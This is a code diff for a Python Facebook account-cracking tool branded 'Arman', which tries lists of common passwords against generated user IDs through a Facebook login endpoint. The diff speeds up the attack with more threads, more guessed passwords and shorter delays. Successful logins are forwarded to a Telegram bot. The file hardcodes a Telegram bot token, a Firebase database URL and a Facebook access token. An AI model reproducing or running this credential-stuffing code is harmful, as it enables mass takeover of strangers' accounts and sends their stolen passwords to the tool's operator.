@@ -37,27 +37,16 @@ FIREBASE_URL = "https://arman-f9a3b-default-rtdb.firebaseio.com/"
 BOT_TOKEN = "8974282237:AAEov6IiXxLPOJT6-yN3GLTmRE643-O-6DY"
 TELEGRAM_USER = "8568795915"
 
-def check_update():
+def get_live_version():
     try:
-        url = "https://arman-f9a3b-default-rtdb.firebaseio.com/123/Version.json"
+        url = f"{FIREBASE_URL}123/Version.json"
         response = requests.get(url, timeout=5)
-        server_version = response.json()
-        
-        current_version = "15.3"
-        
-        if server_version and str(server_version).strip() != str(current_version).strip():
-            print("\n\x1b[38;5;196m========================================\033[0m")
-            print("\x1b[38;5;226m [!] New Version Available on Server!\033[0m")
-            print(f"\x1b[38;5;46m [✓] Updating Tool to Version: {server_version}\033[0m")
-            print("\x1b[38;5;51m [i] Please wait, downloading latest code...\033[0m")
-            print("\x1b[38;5;196m========================================\033[0m")
-            
-            os.system('git pull origin main > /dev/null 2>&1 || git pull > /dev/null 2>&1')
-            print("\n\x1b[38;5;46m[✓] Tool Updated Successfully! Restarting...\033[0m")
-            time.sleep(2)
-            os.execv(sys.executable, ['python'] + sys.argv)
+        ver = response.json()
+        if ver:
+            return str(ver).strip()
     except Exception:
         pass
+    return "15.4"
 
 def get_device_model():
     try:
@@ -198,7 +187,6 @@ def hold_screen_10_seconds():
     time.sleep(1)
 
 def check_key():
-    check_update()
     try:
         for m_node in ["maintenance.json", "maintenance_mode.json"]:
             m_res = requests.get(f"{FIREBASE_URL}{m_node}", timeout=5)
@@ -402,6 +390,7 @@ def get_smart_headers():
 sys.stdout.write('\x1b]2;{ Arman 👑 }\x07')
 
 def show_branding():
+    live_ver = get_live_version()
     if 'win' in sys.platform:
         os.system('cls')
     else:
@@ -420,7 +409,7 @@ def show_branding():
     print("\x1b[38;5;46m[\033[1;97m=\x1b[38;5;46m] \033[1;97mFACEBOOK   \x1b[38;5;46m▶  \033[1;97mARMAN-TOOL")
     print("\x1b[38;5;46m[\033[1;97m=\x1b[38;5;46m] \033[1;97mWHATSAPP   \x1b[38;5;46m▶  \033[1;97m03022745249")
     print("\x1b[38;5;46m[\033[1;97m=\x1b[38;5;46m] \033[1;97mFEATURE    \x1b[38;5;46m▶  \033[1;97mOLD CLONING")
-    print("\x1b[38;5;46m[\033[1;97m=\x1b[38;5;46m] \033[1;97mVERSION    \x1b[38;5;46m▶  \033[1;97m15.3")
+    print(f"\x1b[38;5;46m[\033[1;97m=\x1b[38;5;46m] \033[1;97mVERSION    \x1b[38;5;46m▶  \033[1;97m{live_ver}")
     print("\033[1;97m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\033[0m")
 
 def ____banner____():
@@ -479,7 +468,7 @@ def old_One():
     print(f"\x1b[38;5;51m[i] Starting Cracking Process...\033[0m")
     linex()
     
-    with tred(max_workers=20) as pool:
+    with tred(max_workers=35) as pool:
         for uid in user:
             pool.submit(api_cracking, uid)
 
@@ -489,12 +478,16 @@ def api_cracking(uid):
     sys.stdout.flush()
     try:
         MY_TOKEN = "EAATlPU5kUrABSLZClswny9YmYedyXN7Tj8kqTcNUYvlZALoEm1zKWSpZAoOgZBoGZAeDBkvB7235BSF8eH1s5F2ZCMWqQ5qdJTZBw2CyLZBHZAZCZBr95vhTdXc4tQBAPZCiUkapZAexD1x4P0OyqEt0IlA6xCjj0C9F2uR3i78B0wJ7SdZAvBZCZAoxPXugV9dtSas5iBvmy6kkvK4E72KjxlMwmagDgJrlhBwoLmwi"
-        passwords = ['123456', '12345678', '123456789', 'pakistan', 'khan123', 'samsung', '786786', '12345', 'baazigar']
+        passwords = [
+            '123456', '12345678', '123456789', 'pakistan', 'khan123', 
+            'samsung', '786786', '12345', 'baazigar', '1234560', 
+            '112233', '786000', 'ali123', 'malik123', 'swati123', '123123'
+        ]
         for pw in passwords:
             headers = get_smart_headers()
             url = f"https://graph.facebook.com/auth/login?method=GET&format=json&sdk=ios&sdk_version=2&email=10000{uid}&password={pw}&access_token={MY_TOKEN}"
             
-            res = requests.get(url, headers=headers, timeout=15)
+            res = requests.get(url, headers=headers, timeout=10)
             data = res.json()
             
             if "access_token" in data or "uid" in data:
@@ -505,7 +498,7 @@ def api_cracking(uid):
                 send_clone_alert(f"10000{uid}", pw, "OK")
                 break
                 
-        time.sleep(random.uniform(0.3, 0.9))
+        time.sleep(random.uniform(0.1, 0.4))
         loop += 1
     except Exception:
         loop += 1
